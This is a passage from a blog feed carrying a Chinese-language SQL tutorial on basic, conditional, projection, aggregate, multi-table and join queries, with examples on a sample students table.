&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>SQL—查询数据</title>
        <link>https://ac-lm.github.io/posts/sql/sql%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</link>
        <pubDate>Mon, 28 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/sql/sql%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.liaoxuefeng.com/wiki/1177760294764384&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; SQL教程 @廖雪峰 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1基本查询&#34;&gt;1.基本查询&lt;/h2&gt;
&lt;p&gt;要查询数据库表的数据，我们使用如下的SQL语句：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;表名&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;SELECT * FROM students&lt;/code&gt;时，SELECT是关键字，表示将要执行一个查询，* 表示所有列，FROM表示将要从哪个表查询，该SQL将查询出students表的所有数据。注意：查询结果也是一个二维表，它包含列名和每一行的数据。&lt;/p&gt;
&lt;p&gt;SELECT语句其实并不要求一定要有FROM子句：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述查询会直接计算出表达式的结果。虽然SELECT可以用作计算，但它并不是SQL的强项。此外，不带FROM子句的SELECT语句有一个有用的用途，就是用来判断当前到数据库的连接是否有效。许多检测工具会执行一条SELECT 1;来测试数据库连接。&lt;/p&gt;
&lt;h2 id=&#34;2条件查询&#34;&gt;2.条件查询&lt;/h2&gt;
&lt;p&gt;SELECT语句可以通过WHERE条件来设定查询条件，查询结果是满足查询条件的记录。例如，要指定条件分数在80分或以上的学生，写成WHERE条件就是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; score &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; score &lt;span style=&#34;color:#66d9ef&#34;&gt;BETWEEN&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;条件表达式可以用&lt;code&gt;&amp;lt;条件1&amp;gt; AND &amp;lt;条件2&amp;gt;&lt;/code&gt;表达满足条件1并且满足条件2。例如，符合条件分数在80分或以上，并且还符合条件男生，把这两个条件写出来：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; score &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; gender &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第二种条件是&lt;code&gt;&amp;lt;条件1&amp;gt; OR &amp;lt;条件2&amp;gt;&lt;/code&gt;，表示满足条件1或者满足条件2。例如，把上述AND查询的两个条件改为OR，查询结果就是分数在80分或以上或者男生，满足任意之一的条件即选出该记录：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; score &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OR&lt;/span&gt; gender &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第三种条件是&lt;code&gt;NOT &amp;lt;条件&amp;gt;&lt;/code&gt;，表示不符合该条件的记录。例如，写一个不是2班的学生这个条件:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; class_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; class_id &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;要组合三个或者更多的条件，就需要用小括号 &lt;code&gt;()&lt;/code&gt; 表示如何进行条件运算。例如，编写一个复杂的条件：分数在80以下或者90以上，并且是男生：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; (score &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OR&lt;/span&gt; score &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; gender &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果不加括号，条件运算按照NOT、AND、OR的优先级进行，即NOT优先级最高，其次是AND，最后是OR。加上括号可以改变优先级。&lt;/p&gt;
&lt;h3 id=&#34;常用的条件表达式&#34;&gt;常用的条件表达式&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;条件&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;表达式举例1&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;表达式举例2&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用=判断相等&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;score = 80&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name = &amp;lsquo;abc&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符串需要用单引号括起来&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用&amp;gt;判断大于&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;score &amp;gt; 80&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name &amp;gt; &amp;lsquo;abc&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符串比较根据ASCII码，中文字符比较根据数据库设置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用&amp;gt;=判断大于或相等&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;score &amp;gt;= 80&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name &amp;gt;= &amp;lsquo;abc&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用&amp;lt;判断小于&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;score &amp;lt; 80&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name &amp;lt;= &amp;lsquo;abc&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用&amp;lt;=判断小于或相等&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;score &amp;lt;= 80&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name &amp;lt;= &amp;lsquo;abc&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用&amp;lt;&amp;gt;判断不相等&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;score &amp;lt;&amp;gt; 80&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name &amp;lt;&amp;gt; &amp;lsquo;abc&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用LIKE判断相似&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name LIKE &amp;lsquo;ab%&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;name LIKE &amp;lsquo;%bc%&amp;rsquo;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%表示任意字符，例如&amp;rsquo;ab%&amp;lsquo;将匹配&amp;rsquo;ab&amp;rsquo;，&amp;lsquo;abc&amp;rsquo;，&amp;lsquo;abcd&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;3投影查询&#34;&gt;3.投影查询&lt;/h2&gt;
&lt;p&gt;如果我们只希望返回某些列的数据，而不是所有列的数据，我们可以用&lt;code&gt;SELECT 列1, 列2, 列3 FROM ...&lt;/code&gt;，让结果集仅包含指定列。这种操作称为投影查询&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, score, name &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;SELECT 列1, 列2, 列3 FROM ..&lt;/code&gt;.时，还可以给每一列起个别名，这样，结果集的列名就可以与原表的列名不同。它的语法是&lt;code&gt;SELECT 列1 别名1, 列2 别名2, 列3 别名3 FROM ...&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, score points, name &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;投影查询同样可以接WHERE条件，实现复杂的查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, score points, name &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; gender &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4聚合查询&#34;&gt;4.聚合查询&lt;/h2&gt;
&lt;p&gt;对于统计总数、平均数这类计算，SQL提供了专门的聚合函数，使用聚合函数进行查询，就是聚合查询，它可以快速获得结果。&lt;/p&gt;
&lt;p&gt;COUNT(*) 表示查询所有列的行数，要注意聚合的计算结果虽然是一个数字，但查询的结果仍然是一个二维表，只是这个二维表只有一行一列，并且列名是COUNT(*) 。通常，使用聚合查询时，我们应该给列名设置一个别名，便于处理结果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) num &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students;
&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;num &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;COUNT(*) 和 COUNT (id) 实际上是一样的效果。另外注意，聚合查询同样可以使用 WHERE 条件，因此我们可以方便地统计出有多少男生、多少女生、多少80分以上的学生等。此外要特别注意：如果聚合查询的WHERE条件没有匹配到任何行，COUNT() 会返回 0，而 SUM()、AVG()、MAX() 和 MIN() 会返回 NULL。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) boys &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; gender &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;聚合函数&#34;&gt;聚合函数&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;函数&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;SUM&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;计算某一列的合计值，该列必须为数值类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AVG&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;计算某一列的平均值，该列必须为数值类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;MAX&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;计算某一列的最大值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;MIN&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;计算某一列的最小值&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;分组聚合&#34;&gt;分组聚合&lt;/h3&gt;
&lt;p&gt;对于聚合查询，SQL还提供了“分组聚合”的功能。例如，执行以下这个查询，COUNT()的结果不再是一个，而是3个，这是因为，GROUP BY子句指定了按class_id分组，因此，执行该SELECT语句时，会把class_id相同的列先分组，再分别计算，最终得到3行结果。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; class_id, &lt;span style=&#34;color:#66d9ef&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) num &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BY&lt;/span&gt; class_id;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5多表查询&#34;&gt;5.多表查询&lt;/h2&gt;
&lt;p&gt;SELECT查询不但可以从一张表查询数据，还可以从多张表同时查询数据。查询多张表的语法是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;表1&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;表2&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students, classes;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种一次查询两个表的数据，查询的结果也是一个二维表，它是students表和classes表的“乘积”，即students表的每一行与classes表的每一行都两两拼在一起返回。结果集的列数是students表和classes表的列数之和，行数是students表和classes表的行数之积。&lt;/p&gt;
&lt;p&gt;这种多表查询又称笛卡尔查询，使用笛卡尔查询时要非常小心，由于结果集是目标表的行数乘积，对两个各自有100行记录的表进行笛卡尔查询将返回1万条记录，对两个各自有1万行记录的表进行笛卡尔查询将返回1亿条记录。&lt;/p&gt;
&lt;p&gt;注意，多表查询时，要使用表名.列名这样的方式来引用列和设置别名，这样就避免了结果集的列名重复问题。但是，用表名.列名这种方式列举两个表的所有列实在是很麻烦，所以SQL还允许给表设置一个别名，让我们在投影查询中引用起来稍微简洁一点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt;
    s.id sid,
    s.name,
    s.gender,
    s.score,
    &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;.id cid,
    &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;.name cname
&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students s, classes &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; s.gender &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;.id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6连接查询&#34;&gt;6.连接查询&lt;/h2&gt;
&lt;p&gt;连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。例如，我们想要选出students表的所有学生信息，可以用一条简单的SELECT语句完成（从主表提取元素组成新表）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; s.id, s.name, s.class_id, s.gender, s.score &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students s;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是，假设我们希望结果集同时包含所在班级的名称，上面的结果集只有class_id列，缺少对应班级的name列。&lt;/p&gt;
&lt;p&gt;现在问题来了，存放班级名称的name列存储在classes表中，只有根据students表的class_id，找到classes表对应的行，再取出name列，就可以获得班级名称。&lt;/p&gt;
&lt;p&gt;这时，连接查询就派上了用场。我们先使用最常用的一种内连接——INNER JOIN来实现：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; s.id, s.name, s.class_id, &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;.name class_name, s.gender, s.score
&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students s
&lt;span style=&#34;color:#66d9ef&#34;&gt;INNER&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;JOIN&lt;/span&gt; classes &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;ON&lt;/span&gt; s.class_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;.id;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意INNER JOIN查询的写法是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先确定主表，仍然使用FROM &amp;lt;表1&amp;gt;的语法；&lt;/li&gt;
&lt;li&gt;再确定需要连接的表，使用INNER JOIN &amp;lt;表2&amp;gt;的语法；&lt;/li&gt;
&lt;li&gt;然后确定连接条件，使用ON &amp;lt;条件&amp;hellip;&amp;gt;，这里的条件是s.class_id = c.id，表示students表的class_id列与classes表的id列相同的行需要连接；&lt;/li&gt;
&lt;li&gt;可选：加上WHERE子句、ORDER BY等子句。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;连接方式&#34;&gt;连接方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;INNER JOIN只返回同时存在于两张表的行数据，由于students表的class_id包含1，2，3，classes表的id包含1，2，3，4，所以，INNER JOIN根据条件s.class_id = c.id返回的结果集仅包含1，2，3。&lt;/li&gt;
&lt;li&gt;RIGHT OUTER JOIN返回右表都存在的行。如果某一行仅在右表存在，那么结果集就会以NULL填充剩下的字段。&lt;/li&gt;
